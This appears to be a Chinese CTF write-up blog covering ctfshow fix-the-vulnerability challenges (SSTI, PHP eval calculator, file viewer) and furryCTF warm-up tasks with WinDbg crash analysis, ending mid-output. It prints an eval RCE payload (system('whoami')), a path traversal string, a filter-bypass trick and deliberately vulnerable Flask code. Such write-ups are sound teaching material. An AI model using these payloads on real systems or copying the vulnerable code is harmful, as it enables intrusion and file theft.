<li><strong>用户可控的模板代码</strong>: 在原始代码中，<code>preview</code> 函数通过 <code>tpl = heavy_filter(request.form.get(&quot;tpl&quot;, &quot;&quot;))</code> 获取用户提交的 <code>tpl</code> 参数。</li>
<li><strong>直接渲染用户输入</strong>: 应用随后将这个来自用户的、不可信的 <code>tpl</code> 字符串直接传入 <code>jinja.from_string(tpl).render(ctx)</code> 进行渲染。</li>
<li><strong>后果</strong>: 这允许攻击者构造恶意的模板语法。虽然存在一个 <code>heavy_filter</code> 黑名单过滤器，但它存在绕过缺陷（例如，传入 <code>conconfigfig</code> 会被过滤成 <code>config</code>），攻击者可以利用这个缺陷来读取应用的配置信息（如 <code>app.config</code>，其中包含 <code>FLAG</code>），甚至在更复杂的场景下实现远程代码执行。</li>
</ul>
<h3 id="2-修复方案（补丁中）"><a href="#2-修复方案（补丁中）" class="headerlink" title="2. 修复方案（补丁中）"></a>2. 修复方案（补丁中）</h3><p>补丁的核心思想是遵循了安全开发中的黄金法则：<strong>代码与数据分离 (Code-Data Separation)</strong>。</p>
<p>具体的修复点如下：</p>
<ol>
<li><p><strong>移除了用户对模板的控制权</strong>:</p>
<ul>
<li><strong>修复前</strong>: <code>tpl</code> 变量的值来自于 <code>request.form.get(&quot;tpl&quot;, &quot;&quot;)</code>。</li>
<li><strong>修复后</strong>: 代码中完全删除了从请求中获取 <code>tpl</code> 的逻辑。</li>
</ul>
</li>
<li><p><strong>使用了静态、安全的模板</strong>:</p>
<ul>
<li><strong>修复后</strong>: <code>tpl</code> 变量被硬编码为一个由开发者定义的、固定的字符串：<code>tpl = &quot;新年快乐，$&#123;name&#125;！愿你 $&#123;year&#125; 天天好心情～&quot;</code>。</li>
</ul>
</li>
</ol>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>这份补丁通过<strong>将模板内容从“用户可控”变为“服务器端静态定义”</strong>，从根本上消除了服务器端模板注入（SSTI）的攻击面。</p>
<p>现在，用户的输入 (<code>name</code>) 只能作为<strong>数据</strong>被填充到模板的 <code>$&#123;name&#125;</code> 占位符中，而无法再作为<strong>代码</strong>（模板指令）被执行。这是一种彻底且安全的修复方式。</p>
<p>同时，该修复方案保留了用户输入名字生成贺卡的业务功能，完美符合了 “业务功能一定要正常哦” 的要求。</p>
<p>flag为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;3ce68e7a392155f6b96d5736717eaebf&#125;</span><br></pre></td></tr></table></figure>

<h3 id="9-SafeCalc"><a href="#9-SafeCalc" class="headerlink" title="9.SafeCalc"></a>9.SafeCalc</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">题目描述</span><br><span class="line">过于简单，不用防御（我是菜鸟hh）</span><br></pre></td></tr></table></figure>

<p>calc.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">header(&#x27;Content-Type: application/json; charset=utf-8&#x27;);</span><br><span class="line"></span><br><span class="line">// 增加一个严格的白名单正则表达式</span><br><span class="line">// 只允许数字、小数点、括号、四则运算符和空格</span><br><span class="line">// ^: 字符串开头, $: 字符串结尾, 保证整个字符串都匹配规则</span><br><span class="line">const ALLOWED_CHARS_PATTERN = &#x27;/^[0-9\.\+\-\*\/\(\)\s]*$/&#x27;;</span><br><span class="line"></span><br><span class="line">$expr = $_POST[&#x27;expr&#x27;] ?? &#x27;&#x27;;</span><br><span class="line">if (!is_string($expr)) fail(&#x27;bad request&#x27;);</span><br><span class="line"></span><br><span class="line">$expr = trim($expr);</span><br><span class="line">if ($expr === &#x27;&#x27;) fail(&#x27;empty&#x27;);</span><br><span class="line"></span><br><span class="line">if (strlen($expr) &gt; 100) fail(&#x27;too long&#x27;);</span><br><span class="line"></span><br><span class="line">// 【关键修复点】</span><br><span class="line">// 使用正则表达式检查输入是否只包含允许的字符</span><br><span class="line">if (!preg_match(ALLOWED_CHARS_PATTERN, $expr)) &#123;</span><br><span class="line">    fail(&#x27;invalid expression characters&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 为了防止类似 (1/0) 这样的除零错误导致服务崩溃，使用 try-catch 包裹</span><br><span class="line">$out = &quot;&quot;;</span><br><span class="line">try &#123;</span><br><span class="line">    // 在严格的白名单校验后，eval 不再能执行任意代码，但仍可能因语法错误或运行时错误(如除零)而失败</span><br><span class="line">    // 使用 @ 抑制除零等 warning, 并通过 ErrorException 捕获</span><br><span class="line">    set_error_handler(function($severity, $message, $file, $line) &#123;</span><br><span class="line">        throw new ErrorException($message, 0, $severity, $file, $line);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    eval(&quot;\$out = ($expr);&quot;);</span><br><span class="line"></span><br><span class="line">    restore_error_handler();</span><br><span class="line">&#125; catch (Throwable $e) &#123;</span><br><span class="line">    // 捕获所有可能的错误（包括 ParseError 和 ErrorException）</span><br><span class="line">    restore_error_handler();</span><br><span class="line">    fail(&#x27;invalid expression syntax&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 检查结果是否是数字或布尔值，防止意外输出</span><br><span class="line">if (!is_numeric($out) &amp;&amp; !is_bool($out)) &#123;</span><br><span class="line">    $out = 0; // 或者 fail()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo json_encode([&#x27;ok&#x27; =&gt; true, &#x27;result&#x27; =&gt; $out], JSON_UNESCAPED_UNICODE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function fail(string $msg, int $code = 400): void &#123;</span><br><span class="line">    http_response_code($code);</span><br><span class="line">    echo json_encode([&#x27;ok&#x27; =&gt; false, &#x27;error&#x27; =&gt; $msg], JSON_UNESCAPED_UNICODE);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-核心漏洞：远程代码执行-RCE"><a href="#1-核心漏洞：远程代码执行-RCE" class="headerlink" title="1. 核心漏洞：远程代码执行 (RCE)"></a>1. 核心漏洞：远程代码执行 (RCE)</h3><p><strong>漏洞成因：</strong></p>
<p>原始代码中最危险的一行是：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;\$out=(<span class="subst">$expr</span>);&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>eval()</code> 函数会将其中的字符串参数当作 PHP 代码来执行。原始代码对用户输入的 <code>$expr</code> 变量几乎没有做任何有效的安全过滤，仅仅是检查了长度。</p>
<p>这就意味着，攻击者可以提交任意的 PHP 代码片段作为 <code>expr</code> 的值，这些代码将在你的服务器上被执行。</p>
<p><strong>攻击示例（原始代码会如何被攻击）：</strong></p>
<p>如果攻击者发送一个 POST 请求，内容为 <code>expr=system(&#39;whoami&#39;)</code>，那么服务器上 <code>eval()</code> 执行的代码就会变成：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$out</span> = (<span class="title function_ invoke__">system</span>(<span class="string">&#x27;whoami&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>这会导致服务器执行 <code>whoami</code> 命令，并将执行结果（例如 <code>www-data</code>）返回给攻击者。通过这种方式，攻击者可以：</p>
<ul>
<li>执行任意系统命令 (<code>ls</code>, <code>cat /etc/passwd</code> 等) 来窃取信息。</li>
<li>写入一个 Webshell 文件，从而持久化地控制你的服务器。</li>
<li>获取一个反弹 Shell，完全接管服务器权限。</li>
</ul>
<p>这是一个最高危级别的漏洞。</p>
<hr>
<h3 id="2-修复措施详解"><a href="#2-修复措施详解" class="headerlink" title="2. 修复措施详解"></a>2. 修复措施详解</h3><p>你提供的这段修复代码，通过以下几个关键步骤，有效地封堵了这个漏洞：</p>
<h4 id="第一道防线（核心修复）：输入白名单验证"><a href="#第一道防线（核心修复）：输入白名单验证" class="headerlink" title="第一道防线（核心修复）：输入白名单验证"></a><strong>第一道防线（核心修复）：输入白名单验证</strong></h4><p>这是最关键的修复。代码中增加了：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">ALLOWED_CHARS_PATTERN</span> = <span class="string">&#x27;/^[0-9\.\+\-\*\/\(\)\s]*$/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(ALLOWED_CHARS_PATTERN, <span class="variable">$expr</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">fail</span>(<span class="string">&#x27;invalid expression characters&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>原理</strong>：这里采用了<strong>白名单</strong>策略，而不是黑名单。它定义了一个只包含“安全”字符的集合：数字 (<code>0-9</code>)、小数点 (<code>.</code>)、四则运算符 (<code>+ - * /</code>)、括号 (<code>()</code>) 和空格。</li>
<li><strong>效果</strong>：<code>preg_match</code> 会检查用户输入的 <code>$expr</code> 是否<strong>完全</strong>由这些白名单字符组成。任何包含字母（如 <code>a-z</code>）、分号 (<code>;</code>)、美元符号 (<code>$</code>)、反引号 (<code>`</code>) 等危险字符的输入都会被直接拒绝。这样一来，攻击者就无法构造任何函数名（如 <code>system</code>）或执行任何命令，从根本上杜绝了代码注入的可能性。</li>
</ul>
<h4 id="第二道防线：健壮性与错误处理"><a href="#第二道防线：健壮性与错误处理" class="headerlink" title="第二道防线：健壮性与错误处理"></a><strong>第二道防线：健壮性与错误处理</strong></h4><p>虽然白名单已经阻止了代码执行，但用户仍可能输入格式错误的数学表达式（如 <code>5+*3</code>）或导致运行时错误的表达式（如 <code>1/0</code>）。修复代码通过 <code>try...catch</code> 块和自定义错误处理器增强了程序的健壮性：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(function(...) &#123; ... &#125;);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;\$out = (<span class="subst">$expr</span>);&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">restore_error_handler</span>();</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Throwable</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">restore_error_handler</span>();</span><br><span class="line">    <span class="title function_ invoke__">fail</span>(<span class="string">&#x27;invalid expression syntax&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>效果</strong>：这段代码可以捕获 <code>eval()</code> 在执行过程中可能抛出的任何解析错误（ParseError）或运行时警告&#x2F;错误（如除以零），并将其统一作为 “invalid expression syntax” 失败信息返回，而不会导致 PHP 进程崩溃或在页面上暴露详细的错误堆栈信息。这防止了潜在的**拒绝服务（Denial of Service, DoS）**攻击和信息泄露。</li>
</ul>
<h4 id="第三道防线：输出验证"><a href="#第三道防线：输出验证" class="headerlink" title="第三道防线：输出验证"></a><strong>第三道防线：输出验证</strong></h4><p>在代码的最后，增加了对结果的检查：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$out</span>) &amp;&amp; !<span class="title function_ invoke__">is_bool</span>(<span class="variable">$out</span>)) &#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>效果</strong>：这是一个纵深防御措施。它确保了即使在极端意想不到的情况下 <code>eval()</code> 产生了非数字类型的结果，最终返回给前端的也只会是一个安全的、预期的数值（这里是 <code>0</code>），防止任何潜在的信息泄露。</li>
</ul>
<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>总而言之，这段修复代码：</p>
<ol>
<li><strong>修复了核心的远程代码执行（RCE）漏洞</strong>，通过严格的输入白名单，将用户输入限制在纯数学计算的范畴内。</li>
<li><strong>提升了程序的健壮性</strong>，通过完善的错误处理，防止了因非法数学表达式导致的程序崩溃或信息泄露，也防御了简单的拒绝服务攻击。</li>
<li><strong>贯彻了“纵深防御”的安全思想</strong>，在输入、执行、输出三个环节都设置了检查和保护措施。</li>
</ol>
<p>这是一个非常标准和优秀的漏洞修复范例。</p>
<p>flag为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;62b80ac3c42fe6e9fe7e76e8ed68ca5b&#125;</span><br></pre></td></tr></table></figure>

<h3 id="10-SafeViewer"><a href="#10-SafeViewer" class="headerlink" title="10.SafeViewer"></a>10.SafeViewer</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">题目描述</span><br><span class="line">SafeViewer SafeRender SafeAdmin 共同使用本题的环境</span><br><span class="line"></span><br><span class="line">这3个题目 的flag前面 都会有明显的说明 是哪个题目的flag</span><br><span class="line"></span><br><span class="line">环境变量中flag是占位，和题目无关</span><br></pre></td></tr></table></figure>

<p>第一个flag比较好找你直接在path里输入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../../../../../../</span><br></pre></td></tr></table></figure>

<p>查看根目录，根目录下就有flag文件但是下载完发现没东西，你再看看app那个文件点进去发现app.py</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import zipfile</span><br><span class="line">from flask import Flask, request, Response, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">DATA_DIR = os.environ.get(&quot;B_DATA_DIR&quot;, &quot;/tmp/b_data&quot;)</span><br><span class="line">os.makedirs(DATA_DIR, exist_ok=True)</span><br><span class="line"></span><br><span class="line">def _safe_join(base: str, p: str) -&gt; str:</span><br><span class="line">    return os.path.join(base, p)</span><br><span class="line"></span><br><span class="line">#恭喜你，拿到SafeViewer的FLAG ctfshow&#123;21afe5f9839175d79e0adbcb9d7f2198&#125;</span><br><span class="line">@app.get(&quot;/internal/file&quot;)</span><br><span class="line">def internal_file():</span><br><span class="line">    path = request.args.get(&quot;path&quot;, &quot;docxTemplates&quot;)</span><br><span class="line">    filename = request.args.get(&quot;filename&quot;, &quot;&quot;)</span><br><span class="line"></span><br><span class="line">    target_dir = _safe_join(DATA_DIR, path)</span><br><span class="line"></span><br><span class="line">    if filename:</span><br><span class="line">        fp = os.path.join(target_dir, filename)</span><br><span class="line">        try:</span><br><span class="line">            with open(fp, &quot;rb&quot;) as f:</span><br><span class="line">                return Response(f.read(), content_type=&quot;application/octet-stream&quot;)</span><br><span class="line">        except Exception:</span><br><span class="line">            return Response(&quot;NOT_FOUND&quot;, status=404)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        items = []</span><br><span class="line">        for n in sorted(os.listdir(target_dir)):</span><br><span class="line">            p = os.path.join(target_dir, n)</span><br><span class="line">            items.append(&#123;&quot;name&quot;: n, &quot;is_dir&quot;: os.path.isdir(p)&#125;)</span><br><span class="line">        return jsonify(&#123;&quot;path&quot;: path, &quot;items&quot;: items&#125;)</span><br><span class="line">    except Exception:</span><br><span class="line">        return jsonify(&#123;&quot;path&quot;: path, &quot;items&quot;: []&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.get(&quot;/render&quot;)</span><br><span class="line">def render_xml():</span><br><span class="line">    content = request.args.get(&quot;content&quot;, &quot;Hello&quot;)</span><br><span class="line">    author = request.args.get(&quot;author&quot;, &quot;Anonymous&quot;)</span><br><span class="line">    hide = request.args.get(&quot;hide&quot;, &quot;0&quot;)</span><br><span class="line">    xml = f&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">            &lt;!-- post by &#123;author&#125; --&gt;</span><br><span class="line">            &lt;doc&gt;</span><br><span class="line">            &lt;content&gt;&#123;content&#125;&lt;/content&gt;</span><br><span class="line">            &lt;hide&gt;&#123;hide&#125;&lt;/hide&gt;</span><br><span class="line">            &lt;/doc&gt;</span><br><span class="line">            &#x27;&#x27;&#x27;</span><br><span class="line">    return Response(xml, content_type=&quot;text/xml; charset=utf-8&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#处理SafeViewer服务器的http://viewer:5000/ops/sync接口 过来的数据同步请求</span><br><span class="line">@app.post(&quot;/internal/upload&quot;)</span><br><span class="line">def internal_upload():</span><br><span class="line">    dest_path = &quot;docxTemplates&quot;</span><br><span class="line"></span><br><span class="line">    if &quot;file&quot; not in request.files:</span><br><span class="line">        return _err(&quot;NO_FILE&quot;)</span><br><span class="line"></span><br><span class="line">    f = request.files[&quot;file&quot;]</span><br><span class="line">    if not f or not f.filename:</span><br><span class="line">        return _err(&quot;BAD_FILE&quot;)</span><br><span class="line"></span><br><span class="line">    base_dir = os.path.join(&quot;/app/&quot;, dest_path)</span><br><span class="line">    os.makedirs(base_dir, exist_ok=True)</span><br><span class="line">    zip_path = os.path.join(base_dir, &quot;src.zip&quot;)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        f.save(zip_path)</span><br><span class="line">    except Exception:</span><br><span class="line">        return _err(&quot;SAVE_FAILED&quot;)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        with zipfile.ZipFile(zip_path, &quot;r&quot;) as z:</span><br><span class="line">            z.extractall(base_dir)</span><br><span class="line">    except Exception:</span><br><span class="line">        return _err(&quot;UNZIP_FAILED&quot;)</span><br><span class="line">    finally:</span><br><span class="line">        try:</span><br><span class="line">            os.remove(zip_path)</span><br><span class="line">        except Exception:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">    return jsonify(&#123;&quot;ok&quot;: True, &quot;path&quot;: dest_path&#125;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=5001,debug=False)</span><br></pre></td></tr></table></figure>

<p>从这里注释可以发现flag1:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;21afe5f9839175d79e0adbcb9d7f2198&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ctf</category>
        <category>ctf-wp</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctfshow</tag>
        <tag>misc</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>furryCTF热身赛wp</title>
    <url>/2026/01/03/furryCTF%E7%83%AD%E8%BA%AB%E8%B5%9Bwp/</url>
    <content><![CDATA[<h3 id="furryCTF2025赛前热身题（misc方向）"><a href="#furryCTF2025赛前热身题（misc方向）" class="headerlink" title="furryCTF2025赛前热身题（misc方向）"></a>furryCTF2025赛前热身题（misc方向）</h3><p>比赛网站：<a href="https://furryctf.com/games/5">https://furryctf.com/games/5</a></p>
<h3 id="1-签到题"><a href="#1-签到题" class="headerlink" title="1.签到题"></a>1.签到题</h3><p>题目描述：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">话说，你们有发现比赛平台上藏有一个flag吗？</span><br><span class="line"></span><br><span class="line">注意flag格式哦~</span><br></pre></td></tr></table></figure>

<p>在赛题主页就可以找到：</p>
<img src="/2026/01/03/furryCTF%E7%83%AD%E8%BA%AB%E8%B5%9Bwp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-03%20002231.png" class="" title="赛题主页截图">

<p>flag为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">furryCTF&#123;Hack_for_fun_not_for_profit&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-新的一年，新的开始"><a href="#2-新的一年，新的开始" class="headerlink" title="2.新的一年，新的开始"></a>2.新的一年，新的开始</h3><p>题目描述：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Catch The Future</span><br><span class="line"></span><br><span class="line">Time to own 2025</span><br><span class="line"></span><br><span class="line">Forever young in hacking</span><br><span class="line"></span><br><span class="line">furryCTF&#123;h4ppY_n3w_y34r_2o25_w1th_1Ov3&#125;</span><br><span class="line"></span><br><span class="line">祝各位师傅：</span><br><span class="line"></span><br><span class="line">栈上生花，堆里藏月，逆向不秃，web不坐牢，pwn穿一切，ak全场！ 🚩🎉</span><br></pre></td></tr></table></figure>

<p>这种就是问卷题</p>
<p>flag为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">furryCTF&#123;h4ppY_n3w_y34r_2o25_w1th_1Ov3&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-PassDump"><a href="#3-PassDump" class="headerlink" title="3.PassDump"></a>3.PassDump</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">作为CTFer，很多时候都会有电脑放一夜跑程序的经历。</span><br><span class="line"></span><br><span class="line">但猫猫看着跑一夜碰撞之后蓝屏的电脑，陷入了沉思……</span><br><span class="line"></span><br><span class="line">flag格式为furryCTF&#123;出现问题的文件_蓝屏错误代码_该文件的最后一次编译时间_失败事件的缩写_当时正在使用的应用程序的名称&#125;</span><br><span class="line"></span><br><span class="line">例如，这是一个合法的flag：</span><br><span class="line"></span><br><span class="line">furryCTF&#123;system.exe_0x0000001A_2024.12.31-14:00:00_DPC_Notepad&#125;</span><br></pre></td></tr></table></figure>

<p>这题需要用到windbg,这里链接就不贴了，网上一搜就有</p>
<p>打开windbg后</p>
<p>打开command,也就是命令行</p>
<img src="/2026/01/03/furryCTF%E7%83%AD%E8%BA%AB%E8%B5%9Bwp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-03%20002913.png" class="" title="WinDbg命令行">

<p>一般会有这个蓝标字体，如果没有就自己输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!analyze -v</span><br></pre></td></tr></table></figure>

<img src="/2026/01/03/furryCTF%E7%83%AD%E8%BA%AB%E8%B5%9Bwp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-03%20002934.png" class="" title="分析结果">

<p>这里我把输出结果放一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">12: kd&gt; !analyze -v</span><br><span class="line">Loading Kernel Symbols</span><br><span class="line">..</span><br><span class="line"></span><br><span class="line">Press ctrl-c (cdb, kd, ntsd) or ctrl-break (windbg) to abort symbol loads that take too long.</span><br><span class="line">Run !sym noisy before .reload to track down problems loading symbols.</span><br><span class="line"></span><br><span class="line">.............................................................</span><br><span class="line">................................................................</span><br><span class="line">................................................................</span><br><span class="line">................................................................</span><br><span class="line">..............................................</span><br><span class="line">Loading User Symbols</span><br><span class="line"></span><br><span class="line">Loading unloaded module list</span><br><span class="line">.........................................</span><br><span class="line">*******************************************************************************</span><br><span class="line">*                                                                             *</span><br><span class="line">*                        Bugcheck Analysis                                    *</span><br><span class="line">*                                                                             *</span><br><span class="line">*******************************************************************************</span><br><span class="line"></span><br><span class="line">VIDEO_TDR_FAILURE (116)</span><br><span class="line">Attempt to reset the display driver and recover from timeout failed.</span><br><span class="line">Arguments:</span><br><span class="line">Arg1: ffffe30a4b8cd010, Optional pointer to internal TDR recovery context (TDR_RECOVERY_CONTEXT).</span><br><span class="line">Arg2: fffff8035ce14790, The pointer into responsible device driver module (e.g. owner tag).</span><br><span class="line">Arg3: ffffffffc000009a, Optional error code (NTSTATUS) of the last failed operation.</span><br><span class="line">Arg4: 0000000000000004, Optional internal context dependent data.</span><br><span class="line"></span><br><span class="line">Debugging Details:</span><br><span class="line">------------------</span><br><span class="line"></span><br><span class="line">Unable to load image nvlddmkm.sys, Win32 error 0n2</span><br><span class="line">*** WARNING: Unable to verify timestamp for nvlddmkm.sys</span><br><span class="line"></span><br><span class="line">KEY_VALUES_STRING: 1</span><br><span class="line"></span><br><span class="line">    Key  : Analysis.CPU.mSec</span><br><span class="line">    Value: 2140</span><br><span class="line"></span><br><span class="line">    Key  : Analysis.Elapsed.mSec</span><br><span class="line">    Value: 13194</span><br><span class="line"></span><br><span class="line">    Key  : Analysis.IO.Other.Mb</span><br><span class="line">    Value: 0</span><br><span class="line"></span><br><span class="line">    Key  : Analysis.IO.Read.Mb</span><br><span class="line">    Value: 1</span><br><span class="line"></span><br><span class="line">    Key  : Analysis.IO.Write.Mb</span><br><span class="line">    Value: 0</span><br><span class="line"></span><br><span class="line">    Key  : Analysis.Init.CPU.mSec</span><br><span class="line">    Value: 484</span><br><span class="line"></span><br><span class="line">    Key  : Analysis.Init.Elapsed.mSec</span><br><span class="line">    Value: 28118</span><br><span class="line"></span><br><span class="line">    Key  : Analysis.Memory.CommitPeak.Mb</span><br><span class="line">    Value: 102</span><br><span class="line"></span><br><span class="line">    Key  : Analysis.Version.DbgEng</span><br><span class="line">    Value: 10.0.29482.1003</span><br><span class="line"></span><br><span class="line">    Key  : Analysis.Version.Description</span><br><span class="line">    Value: 10.2509.29.03 amd64fre</span><br><span class="line"></span><br><span class="line">    Key  : Analysis.Version.Ext</span><br><span class="line">    Value: 1.2509.29.3</span><br><span class="line"></span><br><span class="line">    Key  : Bugcheck.Code.LegacyAPI</span><br><span class="line">    Value: 0x116</span><br><span class="line"></span><br><span class="line">    Key  : Bugcheck.Code.TargetModel</span><br><span class="line">    Value: 0x116</span><br><span class="line"></span><br><span class="line">    Key  : Dump.Attributes.AsUlong</span><br><span class="line">    Value: 0x21808</span><br><span class="line"></span><br><span class="line">    Key  : Dump.Attributes.DiagDataWrittenToHeader</span><br><span class="line">    Value: 1</span><br><span class="line"></span><br><span class="line">    Key  : Dump.Attributes.ErrorCode</span><br><span class="line">    Value: 0x0</span><br><span class="line"></span><br><span class="line">    Key  : Dump.Attributes.KernelGeneratedTriageDump</span><br><span class="line">    Value: 1</span><br><span class="line"></span><br><span class="line">    Key  : Dump.Attributes.LastLine</span><br><span class="line">    Value: Dump completed successfully.</span><br><span class="line"></span><br><span class="line">    Key  : Dump.Attributes.ProgressPercentage</span><br><span class="line">    Value: 0</span><br><span class="line"></span><br><span class="line">    Key  : Failure.Bucket</span><br><span class="line">    Value: 0x116_IMAGE_nvlddmkm.sys</span><br><span class="line"></span><br><span class="line">    Key  : Failure.Exception.IP.Address</span><br><span class="line">    Value: 0xfffff8035ce14790</span><br><span class="line"></span><br><span class="line">    Key  : Failure.Exception.IP.Module</span><br><span class="line">    Value: nvlddmkm</span><br><span class="line"></span><br><span class="line">    Key  : Failure.Exception.IP.Offset</span><br><span class="line">    Value: 0x1854790</span><br><span class="line"></span><br><span class="line">    Key  : Failure.Hash</span><br><span class="line">    Value: &#123;c89bfe8c-ed39-f658-ef27-f2898997fdbd&#125;</span><br><span class="line"></span><br><span class="line">    Key  : Faulting.IP.Type</span><br><span class="line">    Value: Paged</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.Enlightenments.ValueHex</span><br><span class="line">    Value: 0x7417df84</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.Flags.AnyHypervisorPresent</span><br><span class="line">    Value: 1</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.Flags.ApicEnlightened</span><br><span class="line">    Value: 0</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.Flags.ApicVirtualizationAvailable</span><br><span class="line">    Value: 1</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.Flags.AsyncMemoryHint</span><br><span class="line">    Value: 0</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.Flags.CoreSchedulerRequested</span><br><span class="line">    Value: 0</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.Flags.CpuManager</span><br><span class="line">    Value: 1</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.Flags.DeprecateAutoEoi</span><br><span class="line">    Value: 1</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.Flags.DynamicCpuDisabled</span><br><span class="line">    Value: 1</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.Flags.Epf</span><br><span class="line">    Value: 0</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.Flags.ExtendedProcessorMasks</span><br><span class="line">    Value: 1</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.Flags.HardwareMbecAvailable</span><br><span class="line">    Value: 1</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.Flags.MaxBankNumber</span><br><span class="line">    Value: 0</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.Flags.MemoryZeroingControl</span><br><span class="line">    Value: 0</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.Flags.NoExtendedRangeFlush</span><br><span class="line">    Value: 0</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.Flags.NoNonArchCoreSharing</span><br><span class="line">    Value: 1</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.Flags.Phase0InitDone</span><br><span class="line">    Value: 1</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.Flags.PowerSchedulerQos</span><br><span class="line">    Value: 0</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.Flags.RootScheduler</span><br><span class="line">    Value: 0</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.Flags.SynicAvailable</span><br><span class="line">    Value: 1</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.Flags.UseQpcBias</span><br><span class="line">    Value: 0</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.Flags.Value</span><br><span class="line">    Value: 55185662</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.Flags.ValueHex</span><br><span class="line">    Value: 0x34a10fe</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.Flags.VpAssistPage</span><br><span class="line">    Value: 1</span><br><span class="line"></span><br><span class="line">    Key  : Hypervisor.Flags.VsmAvailable</span><br><span class="line">    Value: 1</span><br><span class="line"></span><br><span class="line">    Key  